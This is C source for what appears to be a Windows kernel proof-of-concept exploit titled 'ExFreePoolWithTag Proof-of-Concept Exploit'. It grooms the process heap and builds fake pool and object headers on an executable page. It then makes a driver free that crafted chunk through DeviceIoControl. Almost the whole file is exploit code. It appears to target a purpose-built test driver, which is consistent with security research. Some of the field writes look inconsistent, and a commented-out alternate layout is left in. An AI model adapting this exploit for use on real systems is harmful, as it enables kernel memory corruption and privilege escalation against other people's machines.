#include "exploit.h"

char unused = 0;
HANDLE h_driver = (HANDLE)-1, h_heap = 0;
void* heaps[HEAP_OBJECT_COUNT];
char* memory_page = (void*)0;
POOL_HEADER pool_header;
OBJECT_HEADER_QUOTA object_header_quota;
QUAD quad;
OBJECT_HEADER object_header;
char output[1024];
unsigned long bytes_returned = 0L, old_protection = 0L, heap_information = 2;
int success_counter = 0;

int main(int argc, char** argv)
{
	system("title ExFreePool");

	RtlSecureZeroMemory(heaps, sizeof(heaps));
	RtlSecureZeroMemory(&pool_header, sizeof(pool_header));
	RtlSecureZeroMemory(&object_header_quota, sizeof(object_header_quota));
	RtlSecureZeroMemory(&quad, sizeof(quad));
	RtlSecureZeroMemory(&object_header, sizeof(object_header));
	RtlSecureZeroMemory(&output, sizeof(output));

	printf("%s\n[!] ExFreePoolWithTag Proof-of-Concept Exploit\n[!] Lets Exploit!", BANNER);

	h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the ExFreePool primitive driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the ExFreePool primitive driver. Handle Value: 0x%p", h_driver);

	for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		heaps[i] = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 4096);
		if (!heaps[i])
		{
			printf("\n[-] Failed to allocate heap object %d.", i);
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Allocated %d heap objects. Successfully set the process heap into a predictable state.", success_counter);

	h_heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 4096, 4096);
	if (!h_heap)
	{
		printf("\n[-] Failed to retrieve a fixed-sized heap allocation of 4096 bytes. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Retrieved a fixed-sized heap allocation of 4096 bytes. Handle Value: 0x%p", h_heap);

	memory_page = HeapAlloc(h_heap, HEAP_ZERO_MEMORY, 4096);
	if (!memory_page)
	{
		printf("\n[-] Failed to allocate 4096 bytes onto the fixed-sized heap.");
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated 4096 bytes onto the fixed-sized heap. Allocation Address: 0x%p", memory_page);

	if (!VirtualLock(memory_page, 4096))
	{
		printf("\n[-] Failed to lock the page of heap memory. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Locked the page of heap memory.");

	if (!VirtualProtect(memory_page, 4096, PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to mark the allocation as read+write+executable. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Marked the allocation as read+write+executable.");

	success_counter = 0;
	for (int i = 0; i < HEAP_OBJECT_COUNT; i++)
	{
		if (!HeapFree(GetProcessHeap(), 0, heaps[i]))
		{
			printf("\n[-] Failed to free heap object %d. Error: %d (0x%x)", i, GetLastError(), GetLastError());
		}
		else
		{
			success_counter++;
		}
	}
	printf("\n[+] Freed the %d heap objects.", success_counter);

	initialize_pool_header2(&pool_header);
	printf("\n[+] Initialized fake pool header.");

	initialize_object_header_quota2(&object_header_quota);
	printf("\n[+] Initialized fake object header quota.");

	initialize_quad2(&quad);
	printf("\n[+] Initialized fake quad.");

	initialize_object_header2(&object_header, &quad);
	printf("\n[+] Initialized fake object header.");

	// Pool Header
	*memory_page = pool_header.PreviousSize;
	*(memory_page + 1) = pool_header.PoolIndex;
	*(memory_page + 2) = pool_header.BlockSize;
	*(memory_page + 3) = pool_header.PoolType;
	*(memory_page + 4) = pool_header.Ulong1;
	*(memory_page + 8) = pool_header.PoolTag;
	*(memory_page + 12) = pool_header.ProcessBilled;
	*(memory_page + 20) = pool_header.AllocatorBackTraceIndex;
	*(memory_page + 22) = pool_header.PoolTagHash;
	printf("\n[+] Mapped the fake pool header onto the heap allocation.");

	*(memory_page + 24) = object_header_quota.PagedPoolCharge;
	*(memory_page + 28) = object_header_quota.NonPagedPoolCharge;
	*(memory_page + 32) = object_header_quota.SecurityDescriptorCharge;
	*(memory_page + 36) = object_header_quota.Reserved1;
	*(memory_page + 40) = object_header_quota.SecurityDescriptorQuotaBlock;
	*(memory_page + 48) = object_header_quota.Reserved2;
	printf("\n[+] Mapped the fake object header quota onto the heap allocation.");

	*(memory_page + 56) = object_header.PointerCount;
	*(memory_page + 64) = object_header.HandleCount;
	*(memory_page + 72) = object_header.NextToFree;
	*(memory_page + 80) = object_header.Lock;
	*(memory_page + 88) = object_header.TypeIndex;
	*(memory_page + 89) = object_header.TraceFlags;
	*(memory_page + 90) = object_header.DbgRefTrace;
	*(memory_page + 91) = object_header.DbgTracePermanent;
	*(memory_page + 92) = object_header.InfoMask;
	*(memory_page + 93) = object_header.Flags;
	*(memory_page + 94) = object_header.NewObject;
	*(memory_page + 95) = object_header.KernelObject;
	*(memory_page + 96) = object_header.KernelOnlyAccess;
	*(memory_page + 97) = object_header.ExclusiveObject;
	*(memory_page + 98) = object_header.PermanentObject;
	*(memory_page + 99) = object_header.DefaultSecurityQuota;
	*(memory_page + 100) = object_header.SingleHandleEntry;
	*(memory_page + 101) = object_header.DeletedInline;
	*(memory_page + 102) = object_header.Reserved;
	*(memory_page + 106) = object_header.ObjectCreateInfo;
	*(memory_page + 114) = object_header.QuotaBlockCharged;
	*(memory_page + 112) = object_header.SecurityDescriptor;
	*(memory_page + 120) = object_header.Body;
	printf("\n[+] Mapped the fake object header onto the heap allocation.\n[!] Freeing the target pool chunk in 5...");

	/**memory_page = pool_header.PreviousSize;
	*(memory_page + 4) = pool_header.PoolIndex;
	*(memory_page + 8) = pool_header.BlockSize;
	*(memory_page + 16) = pool_header.PoolType;
	*(memory_page + 20) = pool_header.Ulong1;
	*(memory_page + 24) = pool_header.PoolTag;
	*(memory_page + 28) = pool_header.AllocatorBackTraceIndex;
	*(memory_page + 30) = pool_header.PoolTagHash;
	printf("\n[+] Mapped the fake pool header onto the heap allocation.");

	*(memory_page + 32) = object_header_quota.PagedPoolCharge;
	*(memory_page + 36) = object_header_quota.NonPagedPoolCharge;
	*(memory_page + 40) = object_header_quota.SecurityDescriptorCharge;
	*(memory_page + 44) = object_header_quota.Reserved1;
	*(memory_page + 48) = object_header_quota.SecurityDescriptorQuotaBlock;
	*(memory_page + 52) = object_header_quota.Reserved2;
	printf("\n[+] Mapped the fake object header quota onto the heap allocation.");

	*(memory_page + 56) = object_header.PointerCount;
	*(memory_page + 64) = object_header.HandleCount;
	*(memory_page + 72) = object_header.NextToFree;
	*(memory_page + 80) = object_header.Lock;
	*(memory_page + 81) = object_header.TypeIndex;
	*(memory_page + 82) = object_header.TraceFlags;
	*(memory_page + 84) = object_header.DbgRefTrace;
	*(memory_page + 88) = object_header.DbgTracePermanent;
	*(memory_page + 89) = object_header.InfoMask;
	*(memory_page + 90) = object_header.Flags;
	*(memory_page + 94) = object_header.NewObject;
	*(memory_page + 98) = object_header.KernelObject;
	*(memory_page + 102) = object_header.KernelOnlyAccess;
	*(memory_page + 106) = object_header.ExclusiveObject;
	*(memory_page + 110) = object_header.PermanentObject;
	*(memory_page + 114) = object_header.DefaultSecurityQuota;
	*(memory_page + 118) = object_header.SingleHandleEntry;
	*(memory_page + 122) = object_header.DeletedInline;
	*(memory_page + 126) = object_header.Reserved;
	*(memory_page + 130) = object_header.ObjectCreateInfo;
	*(memory_page + 138) = object_header.QuotaBlockCharged;
	*(memory_page + 146) = object_header.SecurityDescriptor;
	*(memory_page + 152) = object_header.Body;
	printf("\n[+] Mapped the fake object header onto the heap allocation.\n[!] Freeing the target pool chunk in 5...");*/

	Sleep(1000);
	for (int i = 4; i > 0; i--)
	{
		printf("\n[!] %d...", i);
		Sleep(1000);
	}
	if (!VirtualUnlock(memory_page, 4096))
	{
		printf("\n[-] Failed to unlock the memory page prior to freeing the chunk.");
		unused = getchar();
		return 1;
	}
	DeviceIoControl(h_driver, TARGET_IOCTL, &memory_page, sizeof(long long), &output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Unlocked the memory page and freed the target pool chunk.\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}